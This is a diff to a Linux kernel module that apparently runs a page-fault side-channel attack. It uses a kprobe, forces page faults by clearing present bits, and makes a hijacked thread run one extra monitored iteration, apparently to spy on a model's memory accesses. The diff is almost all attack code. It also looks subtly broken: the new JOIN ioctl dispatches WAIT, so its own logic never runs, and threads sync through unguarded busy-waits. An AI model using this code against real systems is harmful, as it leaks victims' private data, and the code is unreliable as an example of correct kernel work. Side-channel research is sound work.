@@ -62,7 +62,8 @@ static uint64_t fault_cnt = 0, fault_fault_cnt = 0;
 // APA variables
 static struct nuke_info_t special;
 static struct nuke_info_t *nuke_info_head = NULL;
-static uint8_t monitoring = 0, done = 1;
+static uint8_t monitoring = 0, hijack_done = 0, hijack_start = 0, resume_hijacked_thread = 0, last_iteration = 0;
+static int thread_count = 0, join_count = 0;
 static DEFINE_SPINLOCK(lock_for_waiting);
 
 //region IOCTL Functions
@@ -143,17 +144,44 @@ static ssize_t device_write(struct file *file, const char __user *buffer, size_t
 		break;
 
 	case WAIT:
+		int my_thread_id;
 		spin_lock(&lock_for_waiting);
-		if (done == 1) {
-			pr_info("Letting thread 0 continue\n");
-			done = 0;
-			spin_unlock(&lock_for_waiting);
-		} else {
-			pr_info("Waiting for magic batch to happen on thread 0\n");
-			spin_unlock(&lock_for_waiting);
-			while (done != 1) {;;}
+		my_thread_id = ++thread_count;	// indexes start from 1
+		spin_unlock(&lock_for_waiting);
+		
+		msleep(1000);	// wait for all threads to be launched
+		while (1) {
+			if (hijack_done == 1) {	// finished hijack
+				pr_info("Magic batch to happened on last thread, thread %d released\n", my_thread_id);
+				break;
+			}
+			if (hijack_start == 1 && my_thread_id == thread_count) {	// I am the thread to be hijacked
+				pr_info("Letting thread %d continue\n", my_thread_id);
+				hijack_start = 0;
+				break;
+			}
 		}
 		break;
+	
+	case JOIN:
+		hijack_start = 1;	// when the first join happens, it means that all threads have been launched
+		join_count += 1;	// indexes start from 1
+
+		// If all threads have called join that means that only the hijacked thread remains
+		if (join_count == thread_count) {
+			pr_info("n-1 threads finished. Resuming last thread for one more iteration\n");
+			last_iteration = 1;
+			monitoring = 1;
+			
+			arbitrarily_cause_page_fault(&(special.nuke_pte), special.nuke_virtual_addr);
+			resume_hijacked_thread = 1;
+
+			// Now wait for one more iteration of that thread (until the model page fault)
+			// and then let this thread finish too.
+			while (last_iteration == 1) {;}
+		}
+        
+        break;
 
 	default:
 		break;
@@ -197,6 +225,9 @@ long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl
 		device_write(file, (char *)ioctl_param, i, 0, STOP_MONITORING);
 		break;
 	case IOCTL_WAIT:
+		device_write(file, (char *)ioctl_param, i, 0, WAIT);
+		break;
+	case IOCTL_JOIN:
 		device_write(file, (char *)ioctl_param, i, 0, WAIT);
 		break;
 	default:
@@ -308,12 +339,13 @@ static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long f
 					}
 
 					// Check threshold
-					if (fault_cnt > 24) {
+					if (last_iteration == 0 && fault_cnt > 24) {
 						monitoring = 0;
-						done = 1;
+						hijack_done = 1;
 						pr_info("Putting thread 0 to sleep and waking up other threads now\n");
 
-						msleep(3000);
+						// Wait until ready to resume
+						while (resume_hijacked_thread == 0) {;}
 					}
                 }
 
@@ -329,6 +361,11 @@ static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long f
 					// Undo arbitrarily caused page fault
                     temp_pte = pte_set_flags(pte, _PAGE_PRESENT);
                     set_pte(faulting_pte, temp_pte);
+
+					if (last_iteration == 1) {
+						last_iteration = 0;
+						break;
+					}
 
 					// Ensure the stored addresses page fault at their next access
 					struct nuke_info_t *tmp = nuke_info_head;
